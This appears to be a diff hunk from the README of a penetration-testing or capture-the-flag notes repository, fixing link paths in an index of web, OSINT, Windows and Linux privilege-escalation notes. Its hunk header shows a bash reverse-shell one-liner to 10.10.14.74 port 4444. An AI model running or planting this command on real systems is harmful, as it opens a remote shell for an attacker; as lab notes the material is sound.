@@ -40,7 +40,7 @@ sh -i >& /dev/tcp/10.10.14.74/4444 0>&1
 ### [web](./other/web.md)
 ### [osint](./other/osint.md)
 ### [windows](./other/windows.md)
-### [Linux Privilege Escalation:](./other/src/linux_priv_esc.md)
-### [links](links.md)
+### [Linux Privilege Escalation](./other/src/linux_priv_esc.md)
+### [links](./other/links.md)
 
 Happy hacking!
